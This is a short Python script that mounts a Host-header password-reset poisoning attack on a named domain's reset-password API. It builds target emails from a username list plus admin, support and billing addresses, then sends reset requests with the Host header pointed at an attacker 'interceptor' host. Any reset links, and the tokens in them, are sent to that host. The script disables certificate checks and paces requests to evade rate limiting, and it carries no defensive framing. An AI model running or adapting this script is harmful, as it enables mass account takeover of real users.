import requests
import time
import sys

TARGET_API = "https://seodomains.com.hr/api/guest/client/reset_password"
# Using our local listener (simulated via local IP or tunneled domain)
# In a real scenario, this would be the URL from cloudflared
INTERCEPTOR_HOST = "interceptor.astro.net" 

def harvest():
    with open("paragon_usernames.txt", "r") as f:
        users = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    
    emails = [f"{u}@seodomains.com.hr" for u in users]
    # Add common generic emails
    emails.extend(["admin@seodomains.com.hr", "support@seodomains.com.hr", "billing@seodomains.com.hr"])

    print(f"[!] INITIATING MASS HARVESTING ON {len(emails)} TARGETS...")
    
    for email in emails:
        headers = {
            "Host": INTERCEPTOR_HOST,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
        }
        payload = {"email": email}
        
        try:
            r = requests.post(TARGET_API, json=payload, headers=headers, verify=False, timeout=5)
            if r.status_code == 200:
                print(f"[+] Poisoned reset sent to: {email}")
            else:
                print(f"[-] Failed for {email} (Status: {r.status_code})")
        except Exception as e:
            print(f"[-] Error sending to {email}: {e}")
        
        time.sleep(0.5) # Avoid rate limiting

if __name__ == "__main__":
    harvest()
